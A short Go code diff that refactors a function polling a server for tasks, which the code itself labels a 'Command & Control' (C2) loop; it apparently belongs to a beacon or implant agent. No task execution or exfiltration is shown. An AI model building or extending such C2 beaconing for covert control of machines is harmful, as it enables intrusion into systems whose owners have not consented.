@@ -15,28 +15,27 @@ import (
 )
 
 // runCommandLoop long-polls the server for tasks
-func runCommandLoop(ctx context.Context, cfg Config) {
-	client := &http.Client{
-		Timeout: 40 * time.Second,
-	}
-
+func runCommandLoop(ctx context.Context, client *http.Client, cfg Config) {
 	url := fmt.Sprintf("%s%s?hostname=%s", cfg.BaseURL, cfg.CommandPath, cfg.Hostname)
 	fmt.Println("Starting Command & Control loop at", url)
+
+	ticker := time.NewTicker(5 * time.Second)
+	defer ticker.Stop()
 
 	for {
 		select {
 		case <-ctx.Done():
 			return
-		default:
+		case <-ticker.C:
 			req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
 			if err != nil {
-				time.Sleep(5 * time.Second)
+				fmt.Printf("Error creating request: %v\n", err)
 				continue
 			}
 
 			resp, err := client.Do(req)
 			if err != nil {
-				time.Sleep(10 * time.Second)
+				fmt.Printf("C2 Connection failed: %v\n", err)
 				continue
 			}
 
